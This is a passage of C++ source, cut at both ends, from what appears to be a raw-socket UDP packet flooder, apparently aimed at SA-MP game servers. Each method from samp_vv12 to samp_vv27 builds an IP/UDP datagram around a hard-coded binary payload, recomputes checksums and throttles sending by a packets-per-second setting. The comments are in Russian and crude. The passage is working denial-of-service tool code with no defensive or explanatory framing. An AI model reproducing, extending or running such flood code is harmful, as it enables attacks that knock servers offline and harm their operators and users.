	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x67\x81\x48\xa9\x80\x0f\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\xd0\x02\x85\xb8\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0\xd1\x02\x85\xb8\x14\x49\xec\x00\x30\x00\x00\x0a\x00\xf0\x00\x00\xc0\x00\x00\x07\xe7\x27\xe5\x06\x17\x76\xe6\x56\x42\xe2\xe2\xe0", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv12(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x69\x01\x48\xa9\xc0\x12\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv13(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 29; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x03\x01\xb8\x44\x40\x11\x40\xd0\x00\x00\x00\x00\x07\x03\x91\x5f\x80\x24\xd0\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv14(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe2\x1d\x01\x25\x01", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv15(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 483; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x60\x01\x48\xba\xc0\x53\xe0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xc1\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x27\x46\xe7\x46\xe7\x46\x67\x46\xe7\x47\x07\x47\x07\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x87\x46\xa7\x47\x07\x46\x27\x46\x27\x46\xa7\x47\x07\x40\xc2\x02\x91\x76\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xc3\x02\x91\x76\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xc4\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x07\x46\x27\x46\x07\x46\xa7\x46\xa7\x47\x07\x46\x07\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x87\x46\x07\x46\xa7\x46\x27\x46\x47\x46\x27\x47\x07\x40\xc5\x02\x91\x77\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xc6\x02\x91\x77\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xc7\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x67\x46\xe7\x46\x27\x46\xc7\x46\x27\x46\xa7\x46\x07\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\xc7\x46\xa7\x46\xa7\x46\x07\x46\xc7\x46\xa7\x46\xa7\x40\xc8\x02\x91\x78\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xc9\x02\x91\x78\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xca\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\xc7\x46\xc7\x46\xc7\x46\xa7\x46\x47\x46\x07\x46\xc7\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x07\x46\xc7\x46\xa7\x46\x27\x46\x67\x46\xa7\x47\x07\x40\xcb\x02\x91\x79\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xcc\x02\x91\x79\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv16(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 532; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x66\x81\x40\x26\x04\x14\x65\xde\x00\x20\x00\x07\x67\x46\x47\x46\xe7\x46\xc7\x46\xa7\x46\xc7\x46\xa7\x46\x47\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\xe7\x46\xa7\x46\x27\x46\x27\x46\x27\x46\x27\x46\xe7\x40\xce\x02\x91\x7a\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xcf\x02\x91\x7a\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xd0\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\xc7\x46\x27\x46\x67\x46\x47\x46\x27\x46\x47\x46\x87\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\xa7\x46\xe7\x46\x47\x46\xc7\x46\x07\x46\x47\x46\x47\x40\xd1\x02\x91\x7b\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xd2\x02\x91\x7b\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xd3\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x27\x46\x47\x46\x47\x46\x27\x46\x87\x46\x07\x46\x07\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\xa7\x46\x87\x47\x07\x46\x87\x46\x27\x46\x67\x46\x87\x40\xd4\x02\x91\x7c\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xd5\x02\x91\x7c\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xd6\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x27\x46\x87\x46\x27\x46\xa7\x46\xe7\x46\x87\x46\xc7\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x47\x47\x07\x46\xe7\x46\x07\x46\x47\x46\x87\x46\x27\x40\xd7\x02\x91\x7d\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xd8\x02\x91\x7d\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xd9\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x47\x47\x07\x46\x87\x46\x87\x46\x27\x46\xe7\x46\xa7\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x27\x46\x67\x47\x07\x46\xc7\x46\x87\x46\x07\x46\x07\x40", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv17(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 20; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x6d\x01\x48\xbf\x00\x53\x20\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv18(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 5; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\xe2\x26\x01\x2e\x01", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv19(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 483; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x6d\x81\x48\xbf\x40\x53\xe0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xdc\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x47\x07\x46\x07\x47\x07\x46\x27\x46\xa7\x46\xe7\x46\xc7\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x87\x46\x87\x46\x67\x46\x27\x46\xc7\x46\x87\x46\xa7\x40\xdd\x02\x91\x7f\x00\xa6\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xde\x02\x91\x7f\x80\xa7\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xdf\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x47\x46\x47\x46\x07\x46\xc7\x46\xe7\x46\xa7\x46\x07\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\xc7\x46\xa7\x46\x47\x46\xa7\x46\x87\x46\xe7\x46\x87\x40\xe0\x02\x91\x00\x01\x26\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xe1\x02\x91\x00\x81\x27\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xe2\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x47\x47\x07\x46\xe7\x46\xc7\x46\x67\x46\x07\x46\xa7\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x47\x46\x07\x46\x47\x46\xa7\x47\x07\x46\x67\x46\xc7\x40\xe3\x02\x91\x01\x01\x26\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xe4\x02\x91\x01\x81\x27\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xe5\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x47\x47\x07\x46\x27\x46\x07\x47\x07\x47\x07\x46\x87\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x07\x46\x47\x47\x07\x46\x47\x46\x87\x46\x67\x46\x67\x40\xe6\x02\x91\x02\x01\x26\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xe7\x02\x91\x02\x81\x27\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv20(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 532; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x74\x01\x40\x26\x04\x14\x65\xde\x00\x20\x00\x07\x67\x46\xa7\x46\x87\x46\x67\x46\xa7\x46\xa7\x46\xc7\x47\x07\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x67\x46\x67\x46\xa7\x46\xc7\x46\x07\x46\x47\x46\xe7\x40\xe9\x02\x91\x03\x01\x26\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xea\x02\x91\x03\x81\x27\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xeb\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\xa7\x46\x87\x46\xc7\x46\xe7\x46\x47\x46\x27\x46\xe7\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x07\x46\xc7\x46\xa7\x46\x07\x46\x47\x46\x07\x46\x07\x40\xec\x02\x91\x04\x01\x26\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xed\x02\x91\x04\x81\x27\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xee\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x27\x46\xe7\x46\xa7\x47\x07\x46\x27\x47\x07\x46\x87\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\xc7\x46\x07\x47\x07\x46\xc7\x46\xa7\x46\x47\x46\xc7\x40\xef\x02\x91\x05\x01\x26\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xf0\x02\x91\x05\x81\x27\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xf1\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\xe7\x46\x07\x46\x07\x46\xa7\x46\x67\x46\xc7\x46\x07\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\xa7\x46\x47\x46\xa7\x46\x47\x46\xa7\x47\x07\x47\x07\x40\xf2\x02\x91\x06\x01\x26\x40\x14\x0b\xe4\x80\x00\x00\x55\x74\xe7\x84\xe6\xc0\x10\xf3\x02\x91\x06\x81\x27\xc0\x14\x0b\xe6\x00\x00\x00\x85\x74\xe7\x84\xe6\xc2\x83\x02\x90\x10\xf4\x02\x80\x4c\x08\x14\x65\xde\x00\x20\x00\x07\x67\x46\x87\x47\x07\x46\xa7\x46\x27\x47\x07\x47\x07\x46\x67\x44\x08\x8e\x4d\x2c\xce\x8f\x2e\xad\x8c\xaf\x0b\xed\xa6\x0c\x84\x0c\x4f\x24\x08\x2d\x8c\xaf\x08\x8e\x4d\x2c\xce\x84\x07\x46\x07\x46\x07\x46\x07\x46\x67\x46\xe7\x46\xc7\x46\x07\x40", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv21(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x7c\x05\xc8\xa4\x02\xd2\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv22(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 100; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x7c\x85\xc8\xa4\x42\xd5\x60\x14\x60\xe9\x0f\xff\xf0\x20\x00\x00\x0e\x10\x40\x00\x0f\x20\x30\x00\x00\x00\x00\x00\x00\xfa\x0b\x91\x49\x05\x9e\x80\x20\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv23(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x7d\x85\xc8\xa4\xc2\xd2\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv24(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 71; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x05\x86\x48\xa8\xc2\xcf\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv25(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 17; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x06\x06\x48\xa9\x02\xd2\x68\x14\x71\xe3\x10\x00\x00\x10\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv26(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 71; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
	memcpy((void*)udph + sizeof(struct udphdr), "\x06\x86\x48\xa9\x42\xcf\x40\x10\x14\x71\xda\x20\x20\x00\x00\x20\x00\x00\x1d\x54\x80\x00\x00\x20\x00\x00\x02\x95\xc8\xf3\xdd\x8d\x22\x33\xc0\x00\x00\x00\x00\x00\x0b\x04\x20\x00\x0a\x44\x20\x00\x00\x00\x00\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x08\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00", playloadlen);
	iph->id = NumID += htons(1); //прибавляем на +1 к сгенерированому числу идентификатора ип заголовка
	udph->len = htons(sizeof(struct udphdr) + playloadlen); //общий вес udpheader
	udph->check = 0; //Ебнулэнд
	udph->check = US->checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + playloadlen); //Расчет контрольной суммы UDP датаграммы или TCP заголовка, не доебешся
	if (type == 0)
	{
		usleep(pps);
	}
	return;
}

void Packet::samp_vv27(struct iphdr* iph, struct udphdr* udph)
{
	int playloadlen = 134; //вес пакета udp/ip в байтах 
	void* data = (void*)udph + sizeof(struct udphdr);
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + playloadlen; //общий вес ipheader
